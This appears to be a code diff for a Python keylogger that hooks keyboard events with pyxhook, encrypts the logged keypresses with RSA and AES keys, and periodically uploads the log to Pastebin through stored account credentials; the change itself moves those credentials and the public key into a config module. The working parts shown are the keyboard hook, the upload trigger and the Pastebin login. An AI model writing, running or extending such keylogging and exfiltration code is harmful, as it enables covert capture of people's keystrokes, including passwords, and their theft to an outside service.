@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-import pastebin_creds
+import config
 import os, sys, random, pdb
 import pyxhook
 from Crypto.PublicKey import RSA
@@ -48,9 +48,7 @@ if not os.path.isdir(log_dir):
 
 #Crypto-------------------------------------------------------------------------
 
-with open('keys/key.pub', 'r') as f:
-    public_key = RSA.importKey(f.read())
-    log('[*] Loaded public key from keys/key.pub', verbose)
+public_key = RSA.importKey(config.public_key)
 
 # create a random AES key
 aes_key = Random.new().read(16)
@@ -100,9 +98,9 @@ def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
             buff['keypress_log_count'] = 0
         if buff['keypress_upload_count'] == \
            buff['num_keypresses_before_upload'] and \
-           pastebin_creds.username and \
-           pastebin_creds.password and \
-           pastebin_creds.api_dev_key:
+           config.pastebin_username and \
+           config.pastebin_password and \
+           config.pastebin_api_dev_key:
             with open(log_file, 'r') as f:
                 payload = f.read()
                 upload_to_pastebin(os.path.basename(
@@ -115,14 +113,14 @@ def getOnKeyPress(buff, pb_api, pb_api_key, pb_user_key):
     return onKeyPress
 
 pb_api = PastebinAPI()
-pb_user_key = pb_api.generate_user_key(pastebin_creds.api_dev_key, 
-                                       pastebin_creds.username, 
-                                       pastebin_creds.password)
+pb_user_key = pb_api.generate_user_key(config.pastebin_api_dev_key, 
+                                       config.pastebin_username, 
+                                       config.pastebin_password)
 
 hook = pyxhook.HookManager()
 hook.KeyDown = getOnKeyPress(buff, 
                              pb_api, 
-                             pastebin_creds.api_dev_key, 
+                             config.pastebin_api_dev_key, 
                              pb_user_key)
 hook.HookKeyboard()
 
